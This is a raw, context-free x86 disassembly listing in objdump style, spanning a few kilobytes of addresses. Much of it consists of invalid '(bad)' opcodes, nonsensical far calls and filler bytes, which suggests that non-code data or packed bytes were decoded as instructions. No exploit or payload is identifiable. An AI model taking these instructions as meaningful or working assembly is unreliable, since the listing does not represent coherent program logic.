  40b8ec:	call   FWORD PTR [ecx-0x85ff01]
  40b8f2:	pop    ss
  40b8f3:	add    DWORD PTR [eax],0x56
  40b8f6:	add    BYTE PTR [ecx-0x76eab60e],cl
  40b8fc:	call   FWORD PTR [ebp-0x1]
  40b8ff:	jmp    edi
  40b901:	mov    cl,0xbb
  40b903:	(bad)  
  40b904:	call   FWORD PTR [ebp-0x7d]
  40b907:	call   esi
  40b909:	nop
  40b90a:	(bad)  
  40b90b:	inc    DWORD PTR [eax]
  40b90d:	push   es
  40b90e:	add    bh,bh
  40b910:	jbe    0x40b958
  40b912:	aam    0x83
  40b914:	dec    DWORD PTR [edi+0x4e25ff00]
  40b91a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b91b:	inc    DWORD PTR [eax]
  40b91d:	iret   
  40b91e:	(bad)  
  40b91f:	call   DWORD PTR [edi]
  40b921:	fst    DWORD PTR ds:0xffb0ff00
  40b927:	(bad)  
  40b928:	clc    
  40b929:	dec    ebp
  40b92a:	test   eax,0xff2eff00
  40b92f:	jmp    FWORD PTR [edx-0x333113]
  40b935:	mov    bh,bh
  40b937:	and    DWORD PTR [ebp+0xff3e83],0xe
  40b93e:	(bad)  
  40b93f:	inc    DWORD PTR [eax]
  40b941:	nop
  40b942:	test   edi,edi
  40b944:	sbb    DWORD PTR [ebp-0x1],0xffffffff
  40b948:	call   0x83e1:0xffffc34c
  40b94f:	int3   
  40b950:	pusha  
  40b951:	push   cs
  40b952:	popa   
  40b953:	inc    DWORD PTR [ebx-0x50760078]
  40b959:	mov    ebp,0xc9ffffe0
  40b95e:	add    bh,bh
  40b960:	jmp    0x4057aa
  40b965:	jne    0x40b966
  40b967:	inc    esp
  40b969:	pop    ds
  40b96a:	popa   
  40b96b:	add    BYTE PTR [eax],al
  40b96d:	stc    
  40b96e:	inc    DWORD PTR [eax]
  40b970:	cmp    al,0x67
  40b972:	or     eax,0x89fc00ff
  40b977:	add    BYTE PTR [edi-0x7c7d40],bl
  40b97d:	sbb    eax,0x4ec3ff83
  40b982:	cs (bad) 
  40b984:	dec    DWORD PTR [eax-0x2e727634]
  40b98a:	dec    esi
  40b98b:	cmp    edi,0xffffffb3
  40b98e:	int3   
  40b98f:	or     DWORD PTR ds:0xffffb3e6,0x50
  40b996:	add    bh,bh
  40b998:	pop    esi
  40b999:	cmp    eax,0x1b00ff5e
  40b99e:	int3   
  40b99f:	add    bh,bh
  40b9a1:	and    ch,BYTE PTR [ebx-0x34]
  40b9a4:	sub    DWORD PTR [edx+0x4d14ffff],0xffffffed
  40b9ab:	add    bh,bh
  40b9ad:	fwait
  40b9ae:	add    BYTE PTR [ebx-0xe40273],al
  40b9b4:	(bad)  
  40b9b5:	mov    ebp,0x8547ccff
  40b9ba:	cmp    BYTE PTR [eax],al
  40b9bc:	jmp    esi
  40b9be:	inc    DWORD PTR [eax]
  40b9c0:	add    ebp,DWORD PTR [ebx+ecx*1]
  40b9c3:	int3   
  40b9c4:	jmp    FWORD PTR [eax+eax*1-0x7d]
  40b9c8:	int3   
  40b9c9:	int3   
  40b9ca:	int3   
  40b9cb:	int3   
  40b9cc:	int3   
  40b9cd:	int3   
  40b9ce:	int3   
  40b9cf:	int3   
  40b9d0:	(bad)  
  40b9d1:	(bad)  
  40b9d2:	out    dx,eax
  40b9d3:	sub    al,BYTE PTR [eax]
  40b9d5:	jmp    DWORD PTR [eax]
  40b9d7:	xchg   ebx,eax
  40b9d8:	jmp    FWORD PTR [ecx+0x15]
  40b9db:	add    BYTE PTR [edx-0x30],cl
  40b9de:	dec    esp
  40b9e0:	inc    DWORD PTR [eax]
  40b9e2:	ins    BYTE PTR es:[edi],dx
  40b9e3:	jns    0x40b9b1
  40b9e5:	call   DWORD PTR [edx-0x6a]
  40b9e8:	dec    DWORD PTR [ecx+0x71]
  40b9eb:	add    BYTE PTR [edi],bh
  40b9ed:	jge    0x40b972
  40b9ef:	inc    DWORD PTR [eax]
  40b9f1:	call   FWORD PTR ds:0x7d00ffaf
  40b9f7:	nop
  40b9f8:	add    DWORD PTR [edx+0x185c89b0],0x0
  40b9ff:	inc    DWORD PTR [ebx-0x7cea01]
  40ba05:	inc    DWORD PTR [esi-0x1c]
  40ba08:	and    DWORD PTR [ecx+ecx*2],0x0
  40ba0c:	pop    esi
  40ba0d:	and    edi,edi
  40ba0f:	add    BYTE PTR [ecx-0x9a9634],cl
  40ba15:	add    BYTE PTR [ecx],bh
  40ba17:	loope  0x40ba19
  40ba19:	out    dx,al
  40ba1a:	dec    eax
  40ba1b:	add    BYTE PTR [esp+ebx*1],ch
  40ba1e:	(bad)  
  40ba1f:	(bad)  
  40ba20:	inc    DWORD PTR [ebx-0x618b]
  40ba26:	mov    edi,0xa665ff9c
  40ba2b:	add    ah,cl
  40ba2d:	xchg   BYTE PTR [eax],al
  40ba2f:	mov    edi,edi
  40ba31:	add    BYTE PTR [ebx+0x3c],dl
  40ba34:	add    BYTE PTR [eax],al
  40ba36:	(bad)  
  40ba37:	fld    DWORD PTR [eax]
  40ba39:	mov    DWORD PTR [edi+edi*8-0x7cc6d9],esi
  40ba40:	add    BYTE PTR [ebx-0x7c0087a7],al
  40ba46:	outs   dx,BYTE PTR ds:[esi]
  40ba47:	pop    ds
  40ba48:	add    DWORD PTR [ebx+eiz*8-0x34],0xffffff8c
  40ba4d:	das    
  40ba4e:	add    DWORD PTR [eax],0xffffff83
  40ba51:	int3   
  40ba52:	push   cs
  40ba53:	sub    al,0x83
  40ba55:	add    BYTE PTR [ecx],cl
  40ba57:	lods   eax,DWORD PTR ds:[esi]
  40ba58:	add    bl,bh
  40ba5a:	pop    ebx
  40ba5b:	push   DWORD PTR [ebp-0x3333001f]
  40ba61:	add    BYTE PTR [edx+edi*1+0x0],dl
  40ba65:	jmp    FWORD PTR [edx+edi*8-0x1]
  40ba69:	imul   esi,DWORD PTR [ebp-0xad3000],0xffffffff
  40ba70:	add    BYTE PTR [ebx-0x7c4935],al
  40ba76:	jae    0x40ba3f
  40ba78:	dec    DWORD PTR [edi+eax*2+0x785cff]
  40ba7f:	(bad)  
  40ba80:	(bad)  
  40ba81:	inc    DWORD PTR [edx+0x6d000005]
  40ba87:	je     0x40ba88
  40ba89:	sahf   
  40ba8a:	push   es
  40ba8b:	push   edi
  40ba8d:	or     al,0xff
  40ba8f:	mov    edi,edi
  40ba91:	add    BYTE PTR [eax+eiz*8-0x24b53400],ch
  40ba98:	add    ah,ah
  40ba9a:	fdivr  st,st(7)
  40ba9c:	pop    ss
  40ba9d:	inc    eax
  40ba9e:	(bad)  
  40ba9f:	inc    DWORD PTR [eax]
  40baa1:	mov    DWORD PTR [edx+0x23ff006c],esp
  40baa7:	ss int3 
  40baa9:	nop
  40baaa:	fild   WORD PTR [eax]
  40baac:	mov    edx,0xffff89d2
  40bab1:	dec    DWORD PTR [edx]
  40bab3:	jp     0x40ba81
  40bab5:	inc    DWORD PTR [eax+ecx*2+0x5d72ff]
  40babc:	and    DWORD PTR [eax-0x34],0x0
  40bac0:	mov    DWORD PTR [ebx-0x6987],eax
  40bac6:	test   eax,0xccb8ff1d
  40bacb:	int3   
  40bacc:	adc    edi,DWORD PTR [ecx+ecx*4-0x376007d]
  40bad3:	mov    edi,0xc60183ff
  40bad8:	cmp    DWORD PTR [edi],0xffffff8b
  40badb:	int3   
  40badc:	mov    WORD PTR [esi+0xffffff],?
  40bae2:	shl    BYTE PTR [edx],0xcc
  40bae5:	int3   
  40bae6:	or     eax,0xd3e8ffe8
  40baeb:	(bad)  
  40baec:	jg     0x40baf0
  40baee:	add    DWORD PTR [eax],0xffffffff
  40baf1:	call   FWORD PTR [ecx+0x1ff0041]
  40baf7:	mov    bh,bh
  40baf9:	test   DWORD PTR [ecx],edx
  40bafb:	add    BYTE PTR [esi+0x2d],dl
  40bafe:	inc    DWORD PTR [eax]
  40bb00:	add    BYTE PTR [eax],al
  40bb02:	out    dx,eax
  40bb03:	aaa    
  40bb04:	add    BYTE PTR [eax],al
  40bb06:	adc    al,0x30
  40bb08:	add    BYTE PTR [eax+0x2890ff61],cl
  40bb0e:	add    bh,bh
  40bb10:	dec    DWORD PTR [ecx-0xff08cb]
  40bb16:	daa    
  40bb17:	fiadd  WORD PTR [eax]
  40bb19:	push   esi
  40bb1a:	inc    DWORD PTR [eax]
  40bb1c:	jl     0x40bade
  40bb1e:	cmp    edi,0xffffffff
  40bb21:	add    BYTE PTR [ebx+esi*4],ch
  40bb24:	(bad)  
  40bb25:	push   DWORD PTR [eax+0x5ee400bf]
  40bb2b:	add    BYTE PTR [eax+edi*4-0x1],al
  40bb32:	ja     0x40bb3c
  40bb34:	add    ah,cl
  40bb36:	or     esi,esp
  40bb38:	call   DWORD PTR [eax]
  40bb3a:	into   
  40bb3b:	or     eax,0xffffffdf
  40bb3e:	cmp    edi,0xffffff83
  40bb41:	jmp    DWORD PTR [edx]
  40bb43:	rol    DWORD PTR [eax],0xff
  40bb46:	sbb    DWORD PTR [edi],eax
  40bb48:	call   edx
  40bb4a:	and    BYTE PTR [eax],al
  40bb4c:	adc    al,0x8
  40bb4e:	or     esp,0xffffffcc
  40bb51:	and    edx,0x17
  40bb54:	inc    DWORD PTR [eax]
  40bb56:	fadd   DWORD PTR [ecx]
  40bb58:	dec    DWORD PTR ds:0x260eff96
  40bb5e:	add    bh,bh
  40bb60:	inc    DWORD PTR [eax]
  40bb62:	lods   eax,DWORD PTR ds:[esi]
  40bb63:	cwde   
  40bb64:	inc    DWORD PTR [eax]
  40bb66:	scas   eax,DWORD PTR es:[edi]
  40bb67:	xchg   ecx,eax
  40bb68:	call   DWORD PTR [ebx]
  40bb6a:	sti    
  40bb6b:	or     DWORD PTR [eax+0x59],0xffffffff
  40bb6f:	int3   
  40bb70:	add    DWORD PTR [eax],0xffffff9b
  40bb73:	sub    edi,edi
  40bb75:	push   DWORD PTR [edi-0x19]
  40bb78:	sbb    DWORD PTR [esi-0x480d0031],0xffffffff
  40bb7f:	int3   
  40bb80:	(bad)  
  40bb81:	dec    DWORD PTR [esi]
  40bb83:	arpl   di,di
  40bb85:	jmp    FWORD PTR [eax+0x762c899c]
  40bb8b:	mov    DWORD PTR [edx],edx
  40bb8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb8e:	add    DWORD PTR [eax],0xffffff83
  40bb91:	inc    eax
  40bb93:	dec    esi
  40bb94:	inc    DWORD PTR [eax]
  40bb96:	pushf  
  40bb97:	adc    bh,bh
  40bb99:	pop    ecx
  40bb9a:	mov    cl,BYTE PTR [ecx-0x3300ba88]
  40bba0:	int3   
  40bba1:	add    BYTE PTR [edi-0x6bff0033],al
  40bba7:	inc    eax
  40bba8:	add    BYTE PTR [edi+0x454cffd1],bh
  40bbae:	cmp    edi,0x0
  40bbb1:	add    BYTE PTR [ebx],al
  40bbb3:	mov    DWORD PTR [ecx-0x716701],ecx
  40bbb9:	lea    ebp,[edi-0x1]
  40bbbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbbd:	or     al,0xff
  40bbbf:	inc    DWORD PTR [eax]
  40bbc1:	add    BYTE PTR [esi-0x5d],bh
  40bbc4:	(bad)  
  40bbc5:	jmp    FWORD PTR [ecx+ebx*2-0x330adf01]
  40bbcc:	aad    0xd7
  40bbce:	(bad)  
  40bbcf:	(bad)  
  40bbd0:	inc    DWORD PTR [ebx+0x89ecc4]
  40bbd6:	push   ss
  40bbd7:	mov    cl,0x0
  40bbd9:	jno    0x40bbfb
  40bbdb:	jmp    FWORD PTR ds:0xffff835d
  40bbe1:	dec    DWORD PTR [eax-0x17ff76f8]
  40bbe7:	hlt    
  40bbe8:	call   ecx
  40bbea:	inc    edx
  40bbeb:	dec    DWORD PTR [ecx+edi*8]
  40bbee:	(bad)  
  40bbef:	(bad)  
  40bbf0:	inc    DWORD PTR [eax]
  40bbf2:	scas   al,BYTE PTR es:[edi]
  40bbf3:	mov    eax,ds:0x44b500ff
  40bbf8:	(bad)  
  40bbf9:	cmp    al,0x73
  40bbfb:	add    BYTE PTR [eax+edx*2-0x10000],dl
  40bc02:	jp     0x40bc6a
  40bc04:	(bad)  
  40bc05:	inc    DWORD PTR [ecx-0xc22fff2]
  40bc0b:	inc    DWORD PTR [ebx]
  40bc0d:	xor    DWORD PTR [eax],eax
  40bc0f:	or     esp,0xffffff89
  40bc12:	scas   al,BYTE PTR es:[edi]
  40bc13:	adc    al,0xff
  40bc15:	call   FWORD PTR [eax+0x4d670016]
  40bc1b:	jmp    FWORD PTR [esi+edi*1-0x7d00]
  40bc22:	pop    edi
  40bc23:	into   
  40bc24:	add    DWORD PTR [ebx-0x25ff35bb],0xffffffd7
  40bc2b:	push   esi
  40bc2d:	xchg   ecx,eax
  40bc2e:	(bad)  
  40bc2f:	inc    DWORD PTR [eax]
  40bc31:	(bad)  
  40bc32:	aas    
  40bc33:	and    al,BYTE PTR [eax]
  40bc35:	add    BYTE PTR [eax],dh
  40bc37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc38:	jmp    DWORD PTR [ebx+0x2216ff43]
  40bc3e:	int3   
  40bc3f:	add    ah,cl
  40bc41:	mov    DWORD PTR [edx-0x24],edx
  40bc44:	add    BYTE PTR [ecx-0x76fffd8f],cl
  40bc4a:	sar    edi,cl
  40bc4c:	shl    eax,cl
  40bc4e:	cmp    edi,0x0
  40bc51:	call   FWORD PTR [ecx]
  40bc53:	fdiv   st(7),st
  40bc55:	cmp    edi,0x77
  40bc58:	add    DWORD PTR [ebx],0xffffffec
  40bc5b:	add    dl,al
  40bc5d:	add    BYTE PTR ss:[ecx+0x16ff00],cl
  40bc64:	(bad)  
  40bc65:	(bad)  
  40bc66:	in     al,dx
  40bc67:	test   al,0xcc
  40bc69:	out    dx,al
  40bc6a:	stos   BYTE PTR es:[edi],al
  40bc6b:	int3   
  40bc6c:	fdivr  st(2),st
  40bc6e:	mov    DWORD PTR [ecx+0x3644ccff],ecx
  40bc74:	(bad)  
  40bc75:	(bad)  
  40bc76:	mov    ecx,0xeac4cc95
  40bc7b:	inc    edi
  40bc7d:	mov    esp,0x83898900
  40bc82:	xchg   ebp,eax
  40bc83:	add    BYTE PTR ss:[eax],al
  40bc86:	add    al,0x9b
  40bc88:	call   FWORD PTR ds:0xd114ffcc
  40bc8e:	add    BYTE PTR [eax],al
  40bc90:	int3   
  40bc91:	call   FWORD PTR [ebx-0x7c]
  40bc94:	add    BYTE PTR [eax],al
  40bc96:	dec    ebx
  40bc97:	icebp  
  40bc98:	add    BYTE PTR [eax+esi*2-0x3fde77],dh
  40bc9f:	int3   
  40bca0:	add    bh,bh
  40bca2:	pop    edx
  40bca3:	inc    ebp
  40bca4:	mov    DWORD PTR [ecx-0x2ffcfaf],ecx
  40bcaa:	fcos   
  40bcac:	bound  esp,QWORD PTR [esi]
  40bcae:	(bad)  
  40bcaf:	(bad)  
  40bcb0:	dec    esp
  40bcb2:	mov    dh,bh
  40bcb4:	inc    DWORD PTR [eax]
  40bcb6:	repz repz inc DWORD PTR ds:0x7bf9ff77
  40bcbe:	inc    DWORD PTR [eax]
  40bcc0:	dec    DWORD PTR [ecx+0xc4cd]
  40bcc6:	xor    ah,BYTE PTR [edi+edi*8]
  40bcc9:	add    esi,DWORD PTR ds:0xffab3089
  40bccf:	mov    DWORD PTR [eax],eax
  40bcd1:	call   ebx
  40bcd3:	inc    esp
  40bcd4:	cmp    edi,0x7f
  40bcd7:	in     eax,0xff
  40bcd9:	sub    al,0xc7
  40bcdb:	sub    DWORD PTR [eax],0xc
  40bcde:	inc    DWORD PTR [eax]
  40bce0:	dec    esp
  40bce2:	jmp    0x8140bcbb
  40bce7:	data16 (bad) 
  40bce9:	mov    ecx,0xd18aff08
  40bcee:	add    bh,bh
  40bcf0:	mov    edi,edi
  40bcf2:	ss mov cl,ah
  40bcf5:	push   DWORD PTR [ebx]
  40bcf7:	aaa    
  40bcf8:	mov    DWORD PTR [ecx+ecx*1],ebx
  40bcfb:	int3   
  40bcfc:	and    al,dh
  40bcfe:	int3   
  40bcff:	add    bh,bh
  40bd01:	(bad)  
  40bd02:	mov    esp,0xb4ccff27
  40bd07:	out    0xff,eax
  40bd09:	mov    ah,0x3c
  40bd0b:	add    BYTE PTR [ebp+0x4f],bh
  40bd0e:	mov    edi,edi
  40bd10:	add    BYTE PTR [ecx-0xf86a],cl
  40bd16:	ins    DWORD PTR es:[edi],dx
  40bd17:	out    dx,eax
  40bd18:	(bad)  
  40bd19:	ds hlt 
  40bd1b:	call   FWORD PTR [ebp-0x7c7cff38]
  40bd21:	add    dh,dh
  40bd23:	aad    0x0
  40bd25:	call   DWORD PTR [edi+0x31]
  40bd28:	call   edx
  40bd2a:	out    0xff,al
  40bd2c:	cmp    al,0x89
  40bd2e:	add    BYTE PTR [eax],al
  40bd30:	cmp    edi,0xffffff83
  40bd33:	add    DWORD PTR [bx+si],0xffffff97
  40bd37:	adc    al,0xff
  40bd39:	adc    edx,DWORD PTR [edi-0x33368a00]
  40bd3f:	add    bh,bh
  40bd41:	call   DWORD PTR [ebx+0x54]
  40bd44:	add    bh,bh
  40bd46:	outs   dx,DWORD PTR ds:[esi]
  40bd47:	and    edi,edi
  40bd49:	(bad)  
  40bd4a:	push   edi
  40bd4b:	push   ebx
  40bd4d:	or     esp,0xffffff83
  40bd50:	add    BYTE PTR [eax],al
  40bd52:	imul   ecx
  40bd54:	inc    DWORD PTR [ebx+0x35839af9]
  40bd5a:	xchg   ebp,eax
  40bd5b:	inc    DWORD PTR ds:0xffffff02
  40bd61:	call   edi
  40bd63:	mov    ecx,0x9370ffff
  40bd68:	mov    DWORD PTR [ecx-0x43],ebp
  40bd6b:	(bad)  
  40bd6c:	cmp    ch,BYTE PTR [esi-0x1]
  40bd6f:	inc    DWORD PTR [eax]
  40bd71:	cmp    DWORD PTR [edx],0xffffffa2
  40bd74:	dec    DWORD PTR [ecx-0x217c666f]
  40bd7a:	ins    BYTE PTR es:[edi],dx
  40bd7b:	int3   
  40bd7c:	shl    DWORD PTR [edx-0x7c007c7d],cl
  40bd82:	xchg   esi,eax
  40bd83:	nop
  40bd84:	add    bh,bh
  40bd86:	dec    edi
  40bd87:	es dec esp
  40bd8a:	dec    edi
  40bd8b:	inc    DWORD PTR [ecx]
  40bd8d:	leave  
  40bd8e:	add    bh,bh
  40bd90:	inc    DWORD PTR [eax]
  40bd92:	mov    bl,0x1c
  40bd94:	add    bh,bh
  40bd96:	test   eax,0x2b580024
  40bd9b:	call   FWORD PTR [esi-0x1a]
  40bd9e:	inc    DWORD PTR [eax]
  40bda0:	cmp    edi,0x5b
  40bda3:	ret    
  40bda4:	dec    DWORD PTR [ecx+0x4c000b2b]
  40bdaa:	adc    eax,0x3a29ff
  40bdaf:	add    BYTE PTR [eax],al
  40bdb1:	add    dl,dh
  40bdb3:	or     DWORD PTR [eax],eax
  40bdb5:	add    dl,ah
  40bdb7:	adc    edi,edi
  40bdb9:	add    BYTE PTR [eax-0x34],0x2d
  40bdbd:	add    DWORD PTR [ebx-0x13337c77],0x90ff835b
  40bdc7:	mov    dh,0x0
  40bdc9:	mov    bh,0x43
  40bdcb:	jmp    FWORD PTR [ebp-0xff13]
  40bdd1:	and    DWORD PTR [esi-0x4],0x0
  40bdd5:	sbb    DWORD PTR [edx],0xffffffbe
  40bdd8:	add    cl,dh
  40bdda:	push   edx
  40bddb:	call   FWORD PTR [edx-0x29]
  40bdde:	inc    DWORD PTR [eax]
  40bde0:	inc    DWORD PTR [eax]
  40bde2:	inc    esi
  40bde3:	xchg   ebx,eax
  40bde4:	int3   
  40bde5:	call   DWORD PTR [edi]
  40bde7:	cdq    
  40bde8:	add    BYTE PTR [ebp+0x50],dh
  40bdeb:	jmp    DWORD PTR [ebx]
  40bded:	in     eax,0x0
  40bdef:	(bad)  
  40bdf0:	(bad)  
  40bdf1:	(bad)  
  40bdf2:	inc    DWORD PTR [edx-0x4b6c0000]
  40bdf8:	jmp    FWORD PTR [eax-0x6b]
  40bdfb:	mov    DWORD PTR [eax+0x4c],ebp
  40bdfe:	add    ah,cl
  40be00:	add    DWORD PTR [eax],0xffffff93
  40be03:	push   ecx
  40be04:	int3   
  40be05:	add    dh,ah
  40be07:	rol    DWORD PTR [ebx-0x75007226],0x46
  40be0e:	dec    DWORD PTR [ecx-0x2534007d]
  40be14:	inc    DWORD PTR [eax]
  40be16:	ret    
  40be17:	ins    DWORD PTR es:[edi],dx
  40be18:	(bad)  
  40be19:	clc    
  40be1a:	int3   
  40be1b:	dec    DWORD PTR [esp+edx*4]
  40be1e:	dec    esp
  40be20:	(bad)  
  40be21:	inc    DWORD PTR [esi+0xc]
  40be24:	add    bh,bh
  40be26:	or     eax,0x2cdaff6f
  40be2b:	add    BYTE PTR [esi-0xb5],dh
  40be31:	and    DWORD PTR [esi+0x2b],0xffffffff
  40be35:	inc    DWORD PTR [ebx]
  40be37:	(bad)  
  40be38:	inc    DWORD PTR [edx+0x73]
  40be3b:	add    dh,ah
  40be3d:	and    eax,0xffffff83
  40be42:	mov    bh,0x2a
  40be44:	inc    DWORD PTR [ebx+0x5effa1c2]
  40be4a:	mov    cl,0x0
  40be4c:	mov    esp,0xff0028
  40be51:	dec    DWORD PTR [esi]
  40be53:	out    dx,eax
  40be54:	add    bh,bh
  40be56:	(bad)  
  40be57:	iret   
  40be58:	add    BYTE PTR [ecx-0x15],bh
  40be5b:	or     DWORD PTR [ebx-0x3303],0xffffff83
  40be62:	test   BYTE PTR [ecx+0x0],dl
  40be65:	add    BYTE PTR [ebx-0x55],bh
  40be68:	dec    DWORD PTR [ebx+0x36fafffa]
  40be6e:	add    bh,bh
  40be70:	inc    DWORD PTR [eax]
  40be72:	jl     0x40bdff
  40be74:	add    bh,bh
  40be76:	nop
  40be77:	and    bh,bh
  40be79:	pop    ecx
  40be7a:	inc    DWORD PTR ds:[eax+0x8900b3]
  40be81:	add    BYTE PTR [edx+ebp*4],cl
  40be84:	(bad)  
  40be85:	push   DWORD PTR [ecx]
  40be87:	mov    ds:0xff111400,al
  40be8c:	cmp    ch,ah
  40be8e:	inc    DWORD PTR [ebx+0x1d37ffcc]
  40be94:	add    ah,cl
  40be96:	(bad)  
  40be98:	add    bh,bh
  40be9a:	test   edi,edi
  40be9c:	(bad)  
  40be9d:	(bad)  
  40be9e:	dec    DWORD PTR [ecx-0x15aaff01]
  40bea4:	add    DWORD PTR [ebx-0x23ff037e],0xffffffdc
  40beab:	(bad)  
  40beac:	js     0x40beb8
  40beae:	(bad)  
  40beaf:	inc    DWORD PTR [eax]
  40beb1:	add    BYTE PTR [esi-0x6],dl
  40beb4:	inc    DWORD PTR [ebx+0x2283c173]
  40beba:	jne    0x40be45
  40bebc:	inc    esp
  40bebd:	and    eax,0xffff8300
  40bec2:	ficomp DWORD PTR [edx-0x48c00100]
  40bec8:	jmp    FWORD PTR [esi]
  40beca:	sub    edi,edi
  40becc:	addr16 mov dl,0x0
  40becf:	(bad)  
  40bed0:	(bad)  
  40bed1:	inc    DWORD PTR [ebp-0x59]
  40bed4:	(bad)  
  40bed5:	push   DWORD PTR [ebx]
  40bed7:	mov    ebx,0xffeeffff
  40bedc:	in     eax,0x34
  40bede:	add    bh,bh
  40bee0:	inc    DWORD PTR [ebx-0xc4ca]
  40bee6:	or     eax,0xd892fffe
  40beeb:	add    BYTE PTR [ebx],dl
  40beed:	sub    al,BYTE PTR [eax]
  40beef:	inc    DWORD PTR [ebx-0xed7701]
  40bef5:	add    BYTE PTR [esi-0x67c60011],al
  40befb:	add    BYTE PTR [ecx+edx*2],cl
  40befe:	add    BYTE PTR [ebx-0x40e30100],al
  40bf04:	dec    esp
  40bf06:	(bad)  
  40bf07:	hlt    
  40bf08:	add    BYTE PTR [esp+ebp*4-0x1],cl
  40bf0c:	push   ds
  40bf0d:	popf   
  40bf0e:	add    bh,bh
  40bf10:	cmp    edi,0xffffffa3
  40bf13:	inc    ebp
  40bf14:	add    BYTE PTR [eax],al
  40bf16:	jnp    0x40bf32
  40bf18:	add    cl,bl
  40bf1a:	sub    bh,bh
  40bf1c:	mov    bl,0x15
  40bf1e:	add    DWORD PTR [eax],0xffffffff
  40bf21:	sub    DWORD PTR [ebx],0xffffffbd
  40bf24:	(bad)  
  40bf25:	push   DWORD PTR [esi]
  40bf27:	repz int3 
  40bf29:	xchg   esp,eax
  40bf2a:	in     al,0xff
  40bf2c:	fmul   st(2),st
  40bf2e:	add    ah,cl
  40bf30:	inc    DWORD PTR [eax]
  40bf32:	aas    
  40bf33:	add    BYTE PTR cs:[ecx-0x7004c25],cl
  40bf3a:	mov    bh,0xff
  40bf3c:	jmp    0xcd3fbf85
  40bf41:	mov    DWORD PTR [edi],esi
  40bf43:	xchg   ebp,eax
  40bf44:	add    bh,bh
  40bf46:	mov    bh,0xc0
  40bf48:	sub    DWORD PTR [esi],0xffffff82
  40bf4b:	(bad)  
  40bf4c:	out    dx,eax
  40bf4d:	lds    eax,FWORD PTR [eax]
  40bf4f:	(bad)  
  40bf50:	(bad)  
  40bf51:	dec    DWORD PTR [ebx-0x18]
  40bf54:	(bad)  
  40bf55:	push   DWORD PTR [edi-0x462ff4c]
  40bf5b:	add    BYTE PTR [edi],bl
  40bf5d:	ja     0x40bf5e
  40bf5f:	mov    DWORD PTR [ecx-0x33229901],ecx
  40bf65:	call   esp
  40bf67:	mov    edx,0x9d3cff
  40bf6c:	retf   0xffdf
  40bf6f:	add    ah,cl
  40bf71:	add    BYTE PTR [eax+0x3183ffbe],al
  40bf77:	fadd   DWORD PTR [eax]
  40bf79:	jle    0x40bfaf
  40bf7b:	add    bl,dh
  40bf7d:	mov    bh,0xcc
  40bf7f:	(bad)  
  40bf80:	(bad)  
  40bf81:	call   DWORD PTR [ecx+0x4]
  40bf84:	add    DWORD PTR [eax],0x7a
  40bf87:	xor    bh,bh
  40bf89:	ret    0x53
  40bf8c:	stos   DWORD PTR es:[edi],eax
  40bf8d:	pop    DWORD PTR [ebx+0x5b83ffff]
  40bf93:	into   
  40bf94:	add    BYTE PTR [eax],al
  40bf96:	ror    ebx,1
  40bf98:	jmp    DWORD PTR [edx+ebp*4]
  40bf9b:	int3   
  40bf9c:	cli    
  40bf9d:	mov    ds:0x8389ff89,al
  40bfa2:	loopne 0x40bfcd
  40bfa4:	add    ah,cl
  40bfa6:	in     al,0x1e
  40bfa8:	add    BYTE PTR [eax-0x4d],dh
  40bfab:	xor    DWORD PTR [edx],0xffffff92
  40bfae:	int3   
  40bfaf:	inc    DWORD PTR [eax]
  40bfb1:	add    BYTE PTR [esi+ebx*4+0x166189cc],ch
  40bfb8:	inc    DWORD PTR [eax-0x3]
  40bfbb:	dec    DWORD PTR [ebp+0x83ffdc]
  40bfc1:	int3   
  40bfc2:	lea    edi,[edi-0x7d]
  40bfc5:	add    BYTE PTR ds:0x35800ce,dh
  40bfcb:	int3   
  40bfcc:	lahf   
  40bfcd:	sub    BYTE PTR [eax],al
  40bfcf:	inc    DWORD PTR [eax]
  40bfd1:	inc    eax
  40bfd3:	imul   edi,edi,0xffffffcc
  40bfd6:	mov    al,0x2
  40bfd8:	dec    DWORD PTR [edi]
  40bfda:	mov    ebp,0x83dee183
  40bfdf:	dec    esp
  40bfe1:	dec    ebx
  40bfe3:	adc    eax,0x550c0083
  40bfe8:	and    DWORD PTR [ecx-0x3b],0x0
  40bfec:	jb     0x40bfc6
  40bfee:	(bad)  
  40bfef:	(bad)  
  40bff0:	dec    esp
  40bff2:	mov    al,0xb1
  40bff4:	inc    DWORD PTR [eax]
  40bff6:	cmp    eax,DWORD PTR [ecx-0x996101]
  40bffc:	fistp  QWORD PTR [ecx]
  40bffe:	int3   
  40bfff:	(bad)  
  40c000:	(bad)  
  40c001:	call   FWORD PTR ds:0xd6cc890f
  40c007:	test   DWORD PTR [eax],eax
  40c009:	inc    ebx
  40c00a:	pop    edi
  40c00b:	call   esi
  40c00d:	int3   
  40c00e:	or     esp,0xffffffcc
  40c011:	push   edx
  40c013:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c014:	(bad)  
  40c015:	(bad)  
  40c016:	call   0xd7ecc04e
  40c01b:	call   FWORD PTR [eax]
  40c01d:	adc    DWORD PTR [eax],eax
  40c01f:	add    bh,bh
  40c021:	add    BYTE PTR [eax],cl
  40c023:	lods   al,BYTE PTR ds:[esi]
  40c024:	mov    edi,edi
  40c026:	rol    BYTE PTR [eax-0x7d],cl
  40c029:	test   DWORD PTR [edx],edx
  40c02b:	add    BYTE PTR ds:0x83ffff11,bh
  40c031:	add    BYTE PTR [eax+esi*8+0x0],bl
  40c035:	xor    ebp,0x6e
  40c038:	int3   
  40c039:	mov    ecx,DWORD PTR [ecx-0x76672901]
  40c03f:	(bad)  
  40c040:	(bad)  
  40c041:	jmp    esp
  40c043:	test   BYTE PTR [eax],al
  40c045:	xor    edx,0x40
  40c048:	dec    DWORD PTR [ebx+ebp*8+0xcde383]
  40c04f:	(bad)  
  40c050:	inc    DWORD PTR [ebx-0x7c00a5ce]
  40c056:	xor    DWORD PTR [eax+0x0],esp
  40c059:	pop    es
  40c05a:	enter  0xfff,0xac
  40c05e:	(bad)  
  40c05f:	(bad)  
  40c060:	(bad)  
  40c061:	call   DWORD PTR [eax]
  40c063:	xchg   BYTE PTR [ecx-0x33348700],cl
  40c069:	xor    eax,0xc19fff8c
  40c06e:	(bad)  
  40c06f:	(bad)  
  40c070:	(bad)  
  40c071:	jmp    DWORD PTR [ebp+0xfff00ca]
  40c077:	dec    esp
  40c078:	add    dl,bl
  40c07a:	sub    al,0xff
  40c07c:	aas    
  40c07d:	inc    esp
  40c07e:	inc    DWORD PTR [ebx+0x149cff83]
  40c084:	add    bh,bh
